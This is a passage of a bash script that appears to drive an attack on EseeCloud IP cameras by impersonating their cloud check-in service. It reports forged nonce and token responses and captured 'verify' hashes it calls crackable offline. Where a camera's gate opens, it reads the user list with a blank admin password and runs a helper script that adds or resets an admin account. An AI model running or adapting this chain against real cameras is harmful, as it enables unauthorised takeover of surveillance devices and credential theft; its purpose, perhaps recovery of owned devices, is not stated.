# lines carry no src IP, so the summary is per-session, not per-camera: report
# it once alongside the per-IP ADOPTED verdict so a live chain is visible
# without digging logs.
report_message_chain() {
  local nonces sts posts
  nonces=$(grep -c "NONCE_FORGED" "$SESSION/eseecloud-connections.log" 2>/dev/null || true)
  sts=$(grep -c "STS_FORGED" "$SESSION/eseecloud-connections.log" 2>/dev/null || true)
  posts=$(grep -c "MESSAGE_POST" "$SESSION/eseecloud-connections.log" 2>/dev/null || true)
  nonces=${nonces:-0}; sts=${sts:-0}; posts=${posts:-0}
  echo ""
  echo "── /message/ check-in chain (session-wide) ──"
  if [ "$nonces" -eq 0 ] && [ "$sts" -eq 0 ] && [ "$posts" -eq 0 ]; then
    echo "  ✗ no /message/ chain activity — the camera never asked us for a nonce"
    return
  fi
  if [ "$nonces" -gt 0 ]; then
    echo "  ✓ nonce forgeries:   $nonces (camera asked us for a nonce)"
  else
    echo "  ✗ no /message/nonce requests seen"
  fi
  if [ "$sts" -gt 0 ]; then
    echo "  ✓ sts forgeries:     $sts (/message/sts token requests answered)"
  else
    echo "  - no /message/sts token requests"
  fi
  if [ "$posts" -gt 0 ]; then
    echo "  ✓ message posts:     $posts (camera POSTed post_v2 with verify= computed from our nonce)"
  else
    echo "  ✗ no /message/message posts — the camera never sent a verify= hash back"
  fi
  if [ "$nonces" -gt 0 ] && [ "$posts" -gt 0 ]; then
    echo "  verdict: /message/ chain ADVANCED — verify hashes captured (crackable offline); gate may flip via this path"
  elif [ "$nonces" -gt 0 ]; then
    echo "  verdict: nonce issued but no verify returned — chain stalled before post_v2"
  fi
}

# ── post-capture: LITE cadence + FULL escalation monitor summary ──
# LITE_DELTA lines log each camera's observed LITE 0x00 counter advance
# (natural +0x14 per 20s, or +lite-cadence = the grant was adopted).
# FULL_ESCALATION lines flag the moment a FULL 0x11 registration arrived
# after we granted that camera — the adoption precondition that previously
# required a power-cycle. Both are pure log-greps (no curl), so they run
# before the curl guard like the message-chain report.
report_lite_monitor() {
  local lite_lines esc_lines
  [ "$WS_LITE_MONITOR" = "1" ] || return 0
  lite_lines=$(grep -c "LITE_DELTA" "$SESSION/eseecloud-connections.log" 2>/dev/null || true)
  esc_lines=$(grep -c "FULL_ESCALATION" "$SESSION/eseecloud-connections.log" 2>/dev/null || true)
  lite_lines=${lite_lines:-0}; esc_lines=${esc_lines:-0}
  echo ""
  echo "── LITE cadence + FULL escalation monitor ──"
  if [ "$lite_lines" -eq 0 ] && [ "$esc_lines" -eq 0 ]; then
    echo "  - no LITE deltas / escalations this run (camera stayed in LITE, no FULL 0x11)"
    return
  fi
  if [ "$lite_lines" -gt 0 ]; then
    echo "  ✓ LITE deltas logged: $lite_lines"
    grep "LITE_DELTA" "$SESSION/eseecloud-connections.log" 2>/dev/null | sed 's/^/    /'
  fi
  if [ "$esc_lines" -gt 0 ]; then
    echo "  ★★★ FULL 0x11 ESCALATION: $esc_lines line(s) — adoption precondition met; camera attempting full registration"
    grep "FULL_ESCALATION" "$SESSION/eseecloud-connections.log" 2>/dev/null | sed 's/^/    /'
  else
    echo "  ✗ no FULL 0x11 escalation — LITE grants still not adopted (reset remains the lever)"
  fi
}

verify_and_unlock() {
  local ip adopted gate n ulist
  # Session-wide /message/ chain summary — printed once, before the per-IP
  # gate checks, so a live nonce->verify cycle is visible at a glance. This
  # is a pure log-grep with NO curl dependency, so it runs BEFORE the curl
  # guard: on a curl-less host the chain report must still print (the ADOPTED
  # verdicts and gate probes stay behind the guard where they belong).
  report_message_chain
  report_lite_monitor
  if ! command -v curl >/dev/null 2>&1; then
    echo "  !! curl not installed — skipping gate verification + admin add"
    return
  fi
  for ip in $CAMS; do
    echo ""
    echo "── gate verification: $ip ──"
    # 1) Protocol check-in status: did the camera adopt our granted next-counter?
    #    Match the exact adopted marker "ADOPTED ★★★" — the ws-server also logs
    #    "NOT-ADOPTED" verdicts, and a bare "ADOPTED" grep would count those too.
    adopted=$(grep "src=$ip:" "$SESSION/eseecloud-connections.log" 2>/dev/null | grep -c "ADOPTED ★★★" || true)
    adopted=${adopted:-0}
    if [ "$adopted" -gt 0 ]; then
      if [ "$adopted" -eq 1 ]; then
        echo "  ✓ check-in ADOPTED (protocol): 1 registration used our granted next-counter"
      else
        echo "  ✓ check-in ADOPTED (protocol): $adopted registrations used our granted next-counter"
      fi
    else
      echo "  ✗ no ADOPTED verdict in log this run (gate may still flip via the /message HTTP path)"
    fi
    # 2) Camera-side check-in status probe: "check in falied" = gate closed.
    #    Retry up to 3 times (worst case ~25s incl. curl timeouts): the camera
    #    flips its internal check-in state a beat after adopting the grant, so
    #    a single snapshot could report CLOSED just before it opens (and skip
    #    the admin add).
    gate=""
    n=0
    while [ "$n" -lt 3 ]; do
      n=$((n + 1))
      gate=$(curl -s -m 5 "http://$ip/user/user_list.xml" | tr -d '\r')
      [ -n "$gate" ] && ! echo "$gate" | grep -q "check in falied" && break
      # Sleep only BETWEEN probes (no trailing 5s after the final attempt).
      [ "$n" -lt 3 ] && sleep "$GATE_RETRY_SLEEP"
    done
    if echo "$gate" | grep -q "check in falied"; then
      echo "  ✗ check-in status: /user/*.xml gate still CLOSED (\"check in falied\")"
      echo "  ✗ skipping admin add for $ip"
      continue
    elif [ -z "$gate" ]; then
      echo "  ✗ check-in status: no HTTP response from $ip"
      echo "  ✗ skipping admin add for $ip"
      continue
    fi
    echo "  ✓ check-in status: gate OPEN"
    # 3) User list read — proven live form (truth report 2026-04-19):
    #    /user/user_list.xml?username=admin&password= returns the user XML.
    #    An empty reply usually means the camera's admin password is not blank
    #    (blank is the stock state) — the gate being open is what matters here.
    echo "  user list:"
    ulist=$(curl -s -m 5 "http://$ip/user/user_list.xml?username=admin&password=" | tr -d '\r')
    if [ -n "$ulist" ]; then
      echo "$ulist" | sed 's/^/    /'
    else
      echo "    (no user list returned — admin password may not be blank)"
    fi
    if [ "$AUTO_ADMIN" = "0" ]; then
      echo "  (AUTO_ADMIN=0 — not adding an account)"
      continue
    fi
    echo "  → adding/resetting admin account via eseecloud-add-admin.sh"
    NEW_USER="$ADMIN_USER" NEW_PASS="$ADMIN_PASS" \
      bash "$SCRIPT_DIR/eseecloud-add-admin.sh" "$ip"
  done
}

echo ""
verify_and_unlock
